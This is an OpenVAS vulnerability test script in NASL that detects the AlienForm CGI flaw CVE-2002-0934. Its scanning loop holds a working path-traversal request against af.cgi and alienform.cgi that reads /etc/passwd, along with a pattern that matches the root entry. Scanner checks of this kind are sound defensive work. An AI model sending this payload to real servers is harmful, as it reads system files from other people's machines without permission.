# OpenVAS Vulnerability Test
# $Id: alienform.nasl 17 2013-10-27 14:01:43Z jan $
# Description: AlienForm CGI script
#
# Authors:
# Andrew Hintz ( http://guh.nu )
# based on code writen by Renaud Deraison
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Andrew Hintz (http://guh.nu)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The AlienForm CGI script allows an attacker
to view any file on the target computer, append arbitrary data 
to an existing file, and write arbitrary data to a new file.

The AlienForm CGI script is installed as either af.cgi or
alienform.cgi

For more details, please see:
http://online.securityfocus.com/archive/1/276248/2002-06-08/2002-06-14/0";

tag_solution = "Disable AlienForm";

if(description)
{
 script_id(11027);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4983);
 script_tag(name:"cvss_base", value:"6.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2002-0934");
 name = "AlienForm CGI script";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 
 summary = "Checks if the AlienForm CGI script is vulnerable";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright("This script is Copyright (C) 2002 Andrew Hintz (http://guh.nu)");

 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
afcgi[0] = "af.cgi";
afcgi[1] = "alienform.cgi";

for(d=0;afcgi[d];d=d+1)
{
   req = string(dir, "/", afcgi[d], "?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd");
   req = http_get(item:req, port:port);
   result = http_keepalive_send_recv(port:port, data:req);
   if(result == NULL)exit(0);
   if(egrep(pattern:"root:.*:0:[01]:.*", string:result)){
   	security_hole(port);
	exit(0);
	}
}
}
